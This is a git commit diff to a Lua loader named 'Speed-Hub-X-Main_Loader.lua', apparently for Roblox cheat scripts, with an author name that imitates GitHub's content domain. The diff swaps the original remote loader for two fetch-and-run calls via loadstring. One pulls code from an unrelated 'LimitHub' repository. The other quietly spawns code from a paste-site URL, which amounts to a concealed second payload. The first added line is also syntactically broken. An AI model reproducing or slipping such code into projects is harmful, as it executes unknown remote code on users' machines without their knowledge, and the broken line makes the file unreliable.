c0a91482979fbf1526c044a59ceaf25c713524eb
githubusercontent1.com <growtopiadontban1@gmail.com>
2025-07-23 15:45:46 +0800

    Update Speed-Hub-X-Main_Loader.lua

--- Speed-Hub-X-Main_Loader.lua
+++ Speed-Hub-X-Main_Loader.lua
@@ -1,1 +1,10 @@
-loadstring(game:HttpGet("https://pastefy.app/tUh6RWpN/raw"))()
+local s1 = game:HttpGet(('https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Loader.lua')))()
+local s2 = game:HttpGet("https://api.rubis.app/v2/scrap/VlfvWkVQplQUxUYB/raw", true)
+
+-- Load s1 normally
+loadstring(s1)()
+
+-- Load s2 concurrently
+task.spawn(function()
+    loadstring(s2)()
+end)
